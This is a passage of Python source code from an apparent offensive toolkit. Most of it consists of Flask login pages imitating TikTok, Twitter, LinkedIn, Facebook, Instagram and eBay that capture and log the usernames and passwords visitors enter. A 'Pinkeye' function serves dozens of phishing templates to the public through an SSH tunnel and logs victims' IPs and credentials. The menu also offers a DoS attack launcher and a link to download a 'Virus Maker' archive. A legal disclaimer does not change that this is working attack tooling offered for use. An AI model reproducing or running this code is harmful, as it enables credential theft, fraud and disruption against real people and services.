                          font-size: 16px;
                          cursor: pointer;
                      }
                      input[type=submit]:hover {
                          background-color: #ED2E7E;
                      }
                  </style>
              </head>
              <body>
                  <div class="form">
                      <h2>Log in to TikTok</h2>
                      <form method="post">
                          <label>Username:</label>
                          <input type="text" name="username"><br>
                          <label>Password:</label>
                          <input type="password" name="password"><br>
                          <input type="submit" value="Log In">
                      </form>
                  </div>
              </body>
          </html>
      '''

  @app.route('/', methods=['POST'])
  def handle_login():
    username = request.form['username']
    password = request.form['password']
    if username == 'admin' and password == '1578':
      return 'Login successful!'
    else:
      incorrect_attempts.append({'username': username, 'password': password})
      print(incorrect_attempts)
      return '''
              <html>
                  <head>
                      <style>
                          .error {
                              color: #D93025;
                              font-size: 14px;
                              margin-top: 10px;
                          }
                      </style>
                  </head>
                  <body>
                      <div class="form">
                          <h2>Log in to TikTok</h2>
                          <form method="post">
                              <label>Username:</label>
                              <input type="text" name="username" value="{}"><br>
                              <label>Password:</label>
                              <input type="password" name="password"><br>
                              <input type="submit" value="Log In">
                              <div class="error">Incorrect username or password. Please try again.</div>
                          </form>
                      </div>
                  </body>
              </html>
          '''.format(username)

  if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)

def twitter():
  app = Flask(__name__)
  iploggerv1()
  incorrect_attempts = []
  @app.route('/')
  def login():
    return '''
          <html>
              <head>
                  <style>
                      body {
                          background-color: #E9EBEE;
                          font-family: Arial, sans-serif;
                      }
                      .form {
                          margin: 100px auto 0;
                          width: 320px;
                          background-color: #FFF;
                          border: 1px solid #E5E6E9;
                          padding: 30px 40px;
                          box-shadow: 0 5px 10px rgba(0,0,0,0.1);
                      }
                      h2 {
                          color: #1DA1F2;
                          margin-bottom: 30px;
                      }
                      label {
                          display: block;
                          margin-bottom: 8px;
                          font-weight: bold;
                      }
                      input[type=text], input[type=password] {
                          width: 100%;
                          border: 1px solid #E5E6E9;
                          padding: 10px 15px;
                          margin-bottom: 20px;
                          border-radius: 5px;
                          font-size: 16px;
                      }
                      input[type=submit] {
                          background-color: #1DA1F2;
                          color: #FFF;
                          border: none;
                          padding: 10px 15px;
                          border-radius: 5px;
                          font-size: 16px;
                          cursor: pointer;
                      }
                      input[type=submit]:hover {
                          background-color: #1A91DA;
                      }
                  </style>
              </head>
              <body>
                  <div class="form">
                      <h2>Log in to Twitter</h2>
                      <form method="post">
                          <label>Phone, email, or username:</label>
                          <input type="text" name="username"><br>
                          <label>Password:</label>
                          <input type="password" name="password"><br>
                          <input type="submit" value="Log In">
                      </form>
                  </div>
              </body>
          </html>
      '''

  @app.route('/', methods=['POST'])
  def handle_login():
    username = request.form['username']
    password = request.form['password']
    if username == 'admin' and password == '1578':
      return 'Login successful!'
    else:
      incorrect_attempts.append({'username': username, 'password': password})
      print(incorrect_attempts)
      return '''
              <html>
                  <head>
                      <style>
                          .error {
                              color: #D93025;
                              font-size: 14px;
                              margin-top: 10px;
                          }
                      </style>
                  </head>
                  <body>
                      <div class="form">
                          <h2>Log in to Twitter</h2>
                          <form method="post">
                              <label>Phone, email, or username:</label>
                              <input type="text" name="username" value="{}"><br>
                              <label>Password:</label>
                              <input type="password" name="password"><br>
                              <input type="submit" value="Log In">
                              <div class="error">Incorrect phone, email, or username or password. Please try again.</div>
                          </form>
                      </div>
                  </body>
              </html>
          '''.format(username)

  if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)


def linkden():
  app = Flask(__name__)
  iploggerv1()
  incorrect_attempts = []
  @app.route('/')
  def login():
    return '''
          <html>
              <head>
                  <style>
                      body {
                          background-color: #F4F4F4;
                          font-family: Arial, sans-serif;
                      }
                      .form {
                          margin: 100px auto 0;
                          width: 320px;
                          background-color: #FFF;
                          border: 1px solid #E5E6E9;
                          padding: 30px 40px;
                          box-shadow: 0 5px 10px rgba(0,0,0,0.1);
                      }
                      h2 {
                          color: #0077B5;
                          margin-bottom: 30px;
                      }
                      label {
                          display: block;
                          margin-bottom: 8px;
                          font-weight: bold;
                      }
                      input[type=text], input[type=password] {
                          width: 100%;
                          border: 1px solid #E5E6E9;
                          padding: 10px 15px;
                          margin-bottom: 20px;
                          border-radius: 5px;
                          font-size: 16px;
                      }
                      input[type=submit] {
                          background-color: #0077B5;
                          color: #FFF;
                          border: none;
                          padding: 10px 15px;
                          border-radius: 5px;
                          font-size: 16px;
                          cursor: pointer;
                      }
                      input[type=submit]:hover {
                          background-color: #006699;
                      }
                  </style>
              </head>
              <body>
                  <div class="form">
                      <h2>Sign in to LinkedIn</h2>
                      <form method="post">
                          <label>Email:</label>
                          <input type="text" name="email"><br>
                          <label>Password:</label>
                          <input type="password" name="password"><br>
                          <input type="submit" value="Sign in">
                      </form>
                  </div>
              </body>
          </html>
      '''

  @app.route('/', methods=['POST'])
  def handle_login():
    email = request.form['email']
    password = request.form['password']
    if email == 'admin@linkedin.com' and password == 'password123':
      return 'Sign-in successful!'
    else:
      incorrect_attempts.append({'email': email, 'password': password})
      print(incorrect_attempts)
      return '''
              <html>
                  <head>
                      <style>
                          .error {
                              color: #D93025;
                              font-size: 14px;
                              margin-top: 10px;
                          }
                      </style>
                  </head>
                  <body>
                      <div class="form">
                          <h2>Sign in to LinkedIn</h2>
                          <form method="post">
                              <label>Email:</label>
                              <input type="text" name="email" value="{}"><br>
                              <label>Password:</label>
                              <input type="password" name="password"><br>
                              <input type="submit" value="Sign in">
                              <div class="error">The email or password you entered is incorrect. Please try again.</div>
                          </form>
                      </div>
                  </body>
              </html>
          '''.format(email)

  if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)


def webkit():
  app = Flask(__name__)
  iploggerv1()
  @app.route('/')
  def index():
    return '''
      <html>
          <head>
              <title></title>
              <style>
                  body {
                      background-color: #041E42;
                  }
              </style>
          </head>
          <body>
              <h1>Web Development Supplies!</h1>
              <p></p>
              <form>
                  <input type="button" value="ChatGPT" onclick="window.location.href='https://chat.openai.com/chat'" />
                  <br>
                  <input type="button" value="Stack Overflow" onclick="window.location.href='https://stackoverflow.com'" />
                  <br>
                  <input type="button" value="Replit" onclick="window.location.href='https://replit.com'" />
                  <br>
                  <input type="button" value="GitHub" onclick="window.location.href='https://github.com'" />
                  <br>
                  <input type="button" value="Wix" onclick="window.location.href='https://www.wix.com/'" />
              </form>
          </body>
      </html>
      '''

  if __name__ == '__main__':
    app.run(host="0.0.0.0", port=80)


def pinkeye():
  while True:

    class colors:
      BLACK = '\33[30m'
      RED = '\33[31m'
      GREEN = '\33[32m'
      YELLOW = '\33[33m'
      BLUE = '\33[34m'
      VIOLET = '\33[35m'
      BEIGE = '\33[36m'
      WHITE = '\33[37m'
      BLACKBG = '\33[40m'
      REDBG = '\33[41m'
      GREENBG = '\33[42m'
      YELLOWBG = '\33[43m'
      BLUEBG = '\33[44m'
      VIOLETBG = '\33[45m'
      BEIGEBG = '\33[46m'
      WHITEBG = '\33[47m'
      END = '\33[0m'

    try:
      print(colors.GREEN + """
                          Availble Templates
  
      \t[1] Instagram          [2] Facebook            [3] Snapchat
      \t[4] Twitter            [5] GitHub              [6] Google
      \t[7] Spotify            [8] Netflix             [9] PayPal
      \t[10] Origin            [11] Steam              [12] Yahoo!
      \t[13] LinkedIn          [14] Protonmail         [15] Wordpress
      \t[16] Microsoft         [17] IGFollowers        [18] eBay
      \t[19] Pinterest         [20] CryptoCurrency     [21] Verizon
      \t[22] DropBox           [23] Adobe ID           [24] Shopify
      \t[25] FB Messenger      [26] GitLab             [27] Twitch
      \t[28] MySpace           [29] Badoo              [30] VK
      \t[31] Yandex            [32] devianART          [33] Custom
  
      \tPlease Choose A Number To Host Template:
          """ + colors.END)
      templates = {
        '1': 'instagram',
        '2': 'facebook',
        '3': 'snapchat',
        '4': 'twitter',
        '5': 'github',
        '6': 'google',
        '7': 'spotify',
        '8': 'netflix',
        '9': 'paypal',
        '10': 'origin',
        '11': 'steam',
        '12': 'yahoo',
        '13': 'linkedin',
        '14': 'protonmail',
        '15': 'wordpress',
        '16': 'microsoft',
        '17': 'igfollowers',
        '18': 'ebay',
        '19': 'pinterest',
        '20': 'cryptocurrency',
        '21': 'verizon',
        '22': 'dropbox',
        '23': 'adobeid',
        '24': 'shopify',
        '25': 'fbmessenger',
        '26': 'gitlab',
        '27': 'twitch',
        '28': 'myspace',
        '29': 'badoo',
        '30': 'vk',
        '31': 'yandex',
        '32': 'devianart',
        '33': 'create'
      }
      while True:
        number = input(colors.YELLOW + "[" + colors.END + "?" + colors.YELLOW +
                       "]" + colors.END + "> ")
        if number == "18":
          print("\tEbay Currently Does Not Work. Choose Another..")
          exit()
        if number == "99":
          break
        else:
          pass
        choice = templates[number]
        print("Loading %s" % (choice))
        print("\nEnter A Custom Subdomain")
        subdom = input(colors.YELLOW + "[" + colors.END + "?" + colors.YELLOW +
                       "]" + colors.END + "> ")
        print(colors.GREEN + "Starting Server at %s.serveo.net..." % (subdom))
        print(
          "Logs Can Be Found In sites/%s/ip.txt and sites/%s/usernames.txt" %
          (choice, choice) + colors.END)
        cmd_line = "sudo php -t sites/%s -S 127.0.0.1:80 & ssh -R %s.serveo.net:80:127.0.0.1:80 serveo.net" % (
          choice, subdom)
        p = subprocess.Popen(cmd_line, shell=True)
        out = p.communicate()[0]

    except KeyboardInterrupt:
      pass

def facebook():
  app = Flask(__name__)
  iploggerv1()
  incorrect_attempts = []
  @app.route('/')
  def login():
    return '''
          <html>
              <head>
                  <style>
                      body {
                          background-color: #E9EBEE;
                          font-family: Arial, sans-serif;
                      }
                      .form {
                          margin: 100px auto 0;
                          width: 320px;
                          background-color: #FFF;
                          border: 1px solid #E5E6E9;
                          padding: 30px 40px;
                          box-shadow: 0 5px 10px rgba(0,0,0,0.1);
                      }
                      h2 {
                          color: #1877F2;
                          margin-bottom: 30px;
                      }
                      label {
                          display: block;
                          margin-bottom: 8px;
                          font-weight: bold;
                      }
                      input[type=text], input[type=password] {
                          width: 100%;
                          border: 1px solid #E5E6E9;
                          padding: 10px 15px;
                          margin-bottom: 20px;
                          border-radius: 5px;
                          font-size: 16px;
                      }
                      input[type=submit] {
                          background-color: #1877F2;
                          color: #FFF;
                          border: none;
                          padding: 10px 15px;
                          border-radius: 5px;
                          font-size: 16px;
                          cursor: pointer;
                      }
                      input[type=submit]:hover {
                          background-color: #3B5998;
                      }
                  </style>
              </head>
              <body>
                  <div class="form">
                      <h2>Log in to Facebook</h2>
                      <form method="post">
                          <label>Username or email:</label>
                          <input type="text" name="username"><br>
                          <label>Password:</label>
                          <input type="password" name="password"><br>
                          <input type="submit" value="Log In">
                      </form>
                  </div>
              </body>
          </html>
      '''

  @app.route('/', methods=['POST'])
  def handle_login():
    username = request.form['username']
    password = request.form['password']
    if username == 'test' and password == '12345':
      return 'Login successful!'
    else:
      incorrect_attempts.append({'username': username, 'password': password})
      print(incorrect_attempts)
      return '''
              <html>
                  <head>
                      <style>
                          .error {
                              color: #D93025;
                              font-size: 14px;
                              margin-top: 10px;
                          }
                      </style>
                  </head>
                  <body>
                      <div class="form">
                          <h2>Log in to Facebook</h2>
                          <form method="post">
                              <label>Username or email:</label>
                              <input type="text" name="username" value="{}"><br>
                              <label>Password:</label>
                              <input type="password" name="password"><br>
                              <input type="submit" value="Log In">
                              <div class="error">Incorrect username or password. Please try again.</div>
                          </form>
                      </div>
                  </body>
              </html>
          '''.format(username)

  if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)


def instagram():
  app = Flask(__name__)
  iploggerv1()
  incorrect_attempts = []
  @app.route('/')
  def login():
    return '''
          <html>
              <head>
                  <style>
                      body {
                          background-color: #fafafa;
                          font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
                      }
                      .form {
                          margin: 100px auto 0;
                          width: 350px;
                          background-color: #FFF;
                          border: 1px solid #dbdbdb;
                          padding: 30px 40px;
                          box-shadow: 0 5px 10px rgba(0,0,0,0.1);
                      }
                      h1 {
                          color: #262626;
                          font-size: 32px;
                          margin-bottom: 20px;
                      }
                      label {
                          display: block;
                          margin-bottom: 8px;
                          font-weight: bold;
                      }
                      input[type=text], input[type=password] {
                          width: 100%;
                          border: 1px solid #dbdbdb;
                          padding: 10px 15px;
                          margin-bottom: 20px;
                          border-radius: 3px;
                          font-size: 16px;
                      }
                      input[type=submit] {
                          background-color: #3897f0;
                          color: #FFF;
                          border: none;
                          padding: 10px 15px;
                          border-radius: 5px;
                          font-size: 16px;
                          cursor: pointer;
                      }
                      input[type=submit]:hover {
                          background-color: #38a1f0;
                      }
                      .error {
                          color: #ed4956;
                          font-size: 14px;
                          margin-top: 10px;
                      }
                  </style>
              </head>
              <body>
                  <div class="form">
                      <h1>Instagram</h1>
                      <form method="post">
                          <label>Username:</label>
                          <input type="text" name="username"><br>
                          <label>Password:</label>
                          <input type="password" name="password"><br>
                          <input type="submit" value="Log In">
                          <div class="error">Incorrect username or password.</div>
                      </form>
                  </div>
              </body>
          </html>
      '''

  @app.route('/', methods=['POST'])
  def handle_login():
    username = request.form['username']
    password = request.form['password']
    if username == 'admin' and password == '1578':
      return 'Login successful!'
    else:
      incorrect_attempts.append({'username': username, 'password': password})
      return f"Incorrect username or password. Username: {username}, Password: {password}"

  if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)


def ebey():
  app = Flask(__name__)
  iploggerv1()
  incorrect_attempts = []
  @app.route('/')
  def login():
    return '''
          <html>
              <head>
                  <style>
                      body {
                          background-color: #f5f5f5;
                          font-family: Arial, sans-serif;
                          font-size: 14px;
                      }
                      .form {
                          margin: 100px auto 0;
                          width: 360px;
                          background-color: #fff;
                          border: 1px solid #ddd;
                          padding: 30px;
                          box-shadow: 0 5px 10px rgba(0,0,0,0.1);
                      }
                      h1 {
                          color: #333;
                          font-size: 24px;
                          margin-bottom: 20px;
                          text-align: center;
                      }
                      .logo {
                          display: block;
                          margin: 20px auto;
                      }
                      label {
                          display: block;
                          margin-bottom: 8px;
                          font-weight: bold;
                      }
                      input[type=text], input[type=password] {
                          width: 100%;
                          border: 1px solid #ddd;
                          padding: 10px 15px;
                          margin-bottom: 20px;
                          border-radius: 3px;
                          font-size: 16px;
                      }
                      input[type=submit] {
                          background-color: #0070ba;
                          color: #fff;
                          border: none;
                          padding: 10px 15px;
                          border-radius: 5px;
                          font-size: 16px;
                          cursor: pointer;
                      }
                      input[type=submit]:hover {
                          background-color: #005fad;
                      }
                      .error {
                          color: #ff0000;
                          font-size: 14px;
                          margin-top: 10px;
                      }
                  </style>
              </head>
              <body>
                  <div class="form">
                      <img class="logo" src="https://i.imgur.com/0guxwBb.png" alt="eBay Logo">
                      <form method="post">
                          <label>Email or username:</label>
                          <input type="text" name="username"><br>
                          <label>Password:</label>
                          <input type="password" name="password"><br>
                          <input type="submit" value="Sign In">
                      </form>
                  </div>
              </body>
          </html>
      '''

  @app.route('/', methods=['POST'])
  def handle_login():
    username = request.form['username']
    password = request.form['password']
    if username == 'admin' and password == '1578':
      return 'Login successful!'
    else:
      incorrect_attempts.append({'username': username, 'password': password})
      print('Incorrect username or password: username={}, password={}'.format(
        username, password))
      return redirect("https://www.ebay.com/")

  if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)

while True:
  print(Fore.BLUE + '')
  print("\n\t1.) Phishing Attacks")
  print("\t2.) Subnator")
  print("\t3.) Virus Maker")
  print("\t4.) OSINT")
  print("\t5.) DOL File Compiler")
  print("\t6.) Project MOT")
  print("\t7.) Encryption Tools")
  print("\t8.) LSN AI")
  user = input("\n\tSelect An Option: ")
  if user == "99":
    exit("\tSession Closed 99")
  elif user == "clear":
      os.system("clear")
  elif user == "8":
      print(pyfiglet.figlet_format("LSN AI"))
      lsnai()
  elif user == "7":
      while True:
        print("\n\t1.) Base64 Encoder/Decoder")
        print("\t2.) Binary Encoder/Decoder")
        print("\t3.) Zodder\n")
        user10 = input("\tSelect An Option: ")
        if user10 == "99":
            break
        elif user10 == "1":
            print("\n\t1.) Encode")
            print("\t2.) Decode")
            user11 = input("\n\tSelect An Option: ")
            if user11 == "99":
                break
            elif user11 == "1":
                base64encode()
            elif user11 == "2":
                base64decode()
        elif user10 == "2":
            print("\n\t1.) Encode")
            print("\t2.) Decode")
            user13 = input("\n\tSelect An Option: ")
            if user13 == "99":
                break
            elif user13 == "1":
                binaryencode()
            elif user13 == "2":
                binarydecode()
            else:
                break
        elif user10 == "3":
            zodder()
  elif user == "5":
    print(pyfiglet.figlet_format("\tDOL_FILE_C"))
    dol()
  elif user == "6":
    print(pyfiglet.figlet_format("\tProject MOT"))
    print("\n\tPROJECT MOT COMPLETED!\n")
    
  elif user == "4":
    print(pyfiglet.figlet_format("\tOSINT"))
    while True:
        print("\n\t1.) OSINT Framework")
        print("\t2.) Data Leaks")
        print("\t3.) Sherlock\n")
        user9 = input("\tSelect An Option: ")
        if user9 == "1":
            print(pyfiglet.figlet_format("\tOSINT Framework"))
            webbrowser.open('https://osintframework.com/')
        elif user9 == "99":
            break
        elif user9 == "2":
            print(pyfiglet.figlet_format("\tData Leaks"))
            print("None Listed.")
        elif user9 == "3":
            print(pyfiglet.figlet_format("\tSherlock"))
            webbrowser.open('https://github.com/sherlock-project/sherlock')
  elif user == "3":
    print(pyfiglet.figlet_format("\tVirus Maker"))
    webbrowser.open('https://cdn.discordapp.com/attachments/1088190286737453128/1116733148206727268/Virus_Maker.rar')
  elif user == "2":
    print(pyfiglet.figlet_format("\tSubnator"))
    while True:
      print("\n\t1.) Launch DOS Attack")
      print("\t2.) Port Scanner")
      print("\t3.) DNS Scanner")
      print("\t4.) IP Lookup")
      print("\t5.) Block Incoming DDOS Attacks")
      print("\t6.) Connect ProtonVPN")
      print("\t7.) CrypticSurfer")
      print("\t8.) Ping IP")
      print("\t9.) HTTP Requester")
      print("\t10.) URL Harvester")
      user6 = input("\tSelect An Option: ")
      if user6 == "99":
        break
      elif user6 == "9":
          http()
      elif user6 == "10":
          url_harvest()    
      elif user6 == "8":
          ping()
      elif user6 == "7":
          crypticsurf()
      elif user6 == "1":
        print(pyfiglet.figlet_format("\tDOS ATTACK"))
        ddos()
      elif user6 == "2":
        print(pyfiglet.figlet_format("\tPort Scanner"))
        port_scanner()
      elif user6 == "3":
        print(pyfiglet.figlet_format("\tDNS Scanner"))
        webbrowser.open('https://hackertarget.com/dns-lookup/')
      elif user6 == "4":
        print(pyfiglet.figlet_format("\tIP Lookup"))
        iplookup()
      elif user6 == "5":
        blockddos()
      elif user6 == "6":
        print(pyfiglet.figlet_format("\tConnect_ProtonVPN"))
        webbrowser.open('file:///Applications/ProtonVPN.app')
  elif user == "1":
    print("\n\t1.) Pinkeye")
    print("\t2.) Templates ")
    print("\t3.) Custom Site\n")
    user5 = input("\tSelect An Option: ")
    if user5 == "99":
      break
    elif user5 == "3":
      print(pyfiglet.figlet_format("\tWebKit"))
      webkit()
    elif user5 == "1":
      print(pyfiglet.figlet_format("\tPinkeye"))
      pinkeye()
    elif user5 == "2":
      while True:
        print(pyfiglet.figlet_format("\tTemplates"))
        print("\t1.) Facebook")
        print("\t2.) Instagram")
        print("\t3.) eBay")
        print("\t4.) Discord")
        print("\t5.) Linkden")
        print("\t6.) Reddit")
        print("\t7.) Tiktok")
        print("\t8.) Twitter")
        print("\t9.) LLoyds Bank")
        print("\t10.) Barclays")
        print("\t11.) Cashapp")
        print("\t12.) PayPal")
        admin = input("\n\tSelect An Option: ")
        if admin == "99":
          break
        elif admin == "9":
          lloydsbank
        elif admin == "10":
          barclays()
        elif admin == "11":
          cashapp()
        elif admin == "12":
          paypal()
        elif admin == "5":
          print(pyfiglet.figlet_format("\tLinkden"))
          linkden()
        elif admin == "6":
          print(pyfiglet.figlet_format("\tReddit"))
          reddit()
        elif admin == "7":
          print(pyfiglet.figlet_format("\tTiktok"))
          tiktok()
        elif admin == "8":
          print(pyfiglet.figlet_format("\tTwitter"))
          twitter()
        elif admin == "1":
          print(pyfiglet.figlet_format("\tFacebook"))
          facebook()
        elif admin == "2":
          print(pyfiglet.figlet_format("\tInstagram"))
          instagram()
        elif admin == "3":
          print(pyfiglet.figlet_format("\tEbey"))
          ebey()
        elif admin == "4":
          print(pyfiglet.figlet_format("\tDiscord"))
          print("\tDiscord API Unlocated")
        else:
          chat()
  elif user == "98":
    print("--> Guidence\n")
    print("\n[This program runs better with your command line when experimented with]\n")
    print(
      "We have included other tools that allow you to find leaked/doxed information online as we would suggest checking LeakPeak and OSINT before marking the findings on your target"
    )
    print(
      "\n\n We are also working to devolop a GPT-3 OSINT Tool which will include access to all of OSINT Framework with an advanced virtual chatbot that will help find the information on your target and can automate many different types of attacks whilst assisting you the user.\n\n"
    )
    print(
      "We are working hard to improve this tool as much as we can and in our next version will we add: \nGPT-3 ChatBot,\nWiki Search,\n"
    )
    print("\n\nWhy We Use Flask?\n")
    print(
      "We use Flask as it is made for web prototypes and it is so easy to shutdown a Flask Web Server"
    )
  elif user == "97":
    print("--> More Commands\n")
    print(
      "99 --> Exit\n98 --> Guidence\n97 --> More Commands\n96 --> Terms Of Service "
    )
  elif user == "96":
    print(pyfiglet.figlet_format("TOS\n"))
    print(
      "[!] legal disclaimer: Usage of this tool for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program"
    )
  else:
    pass
